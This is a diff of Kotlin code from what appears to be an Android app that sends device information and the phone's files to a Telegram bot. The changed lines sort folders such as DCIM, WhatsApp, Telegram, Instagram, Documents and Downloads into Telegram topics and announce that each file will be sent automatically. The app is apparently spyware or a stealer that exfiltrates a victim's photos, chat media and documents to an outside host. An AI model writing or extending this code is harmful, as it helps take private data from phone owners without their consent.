@@ -416,14 +416,13 @@ ${DeviceInfo(applicationContext).getDeviceInfoJson()}
             enviarConfirmacionTelegram(token, chatId, "📁 Creando estructura de temas en Telegram...")
             
             val folders = listOf(
-                "📸 DCIM",
-                "📸 DCIM/Camera",
-                "📸 DCIM/Screenshots", 
-                "📸 DCIM/WhatsApp",
-                "📸 DCIM/Telegram",
-                "📸 DCIM/Instagram",
-                "📸 DCIM/Downloads",
-                "📸 DCIM/Other",
+                "📸 DCIM - Camera",
+                "📸 DCIM - Screenshots", 
+                "📸 DCIM - WhatsApp",
+                "📸 DCIM - Telegram",
+                "📸 DCIM - Instagram",
+                "📸 DCIM - Downloads",
+                "📸 DCIM - Other",
                 "📸 Pictures",
                 "🎥 Movies",
                 "🎥 Videos",
@@ -483,15 +482,27 @@ ${DeviceInfo(applicationContext).getDeviceInfoJson()}
                 🕐 Fecha: ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
                 
                 *Temas disponibles:*
-                • 📸 DCIM (Camera, Screenshots, WhatsApp, etc.)
-                • 🎥 Videos y Movies
-                • 🎵 Music, Ringtones, Notifications
-                • 📄 Documents y Downloads
+                • 📸 DCIM - Camera
+                • 📸 DCIM - Screenshots
+                • 📸 DCIM - WhatsApp
+                • 📸 DCIM - Telegram
+                • 📸 DCIM - Instagram
+                • 📸 DCIM - Downloads
+                • 📸 DCIM - Other
+                • 📸 Pictures
+                • 🎥 Movies
+                • 🎥 Videos
+                • 🎵 Music
+                • 🎵 Ringtones
+                • 🎵 Notifications
+                • 🎵 Alarms
+                • 📄 Documents
+                • 📄 Downloads
                 • 📱 Apps
                 • 📁 Other
                 
                 Los archivos se organizarán automáticamente según su ubicación.
-                Para usar un tema, envía un archivo con el caption del tema deseado.
+                Cada archivo se enviará con el caption del tema correspondiente.
             """.trimIndent()
             
             enviarConfirmacionTelegram(token, chatId, mensajeFinal)
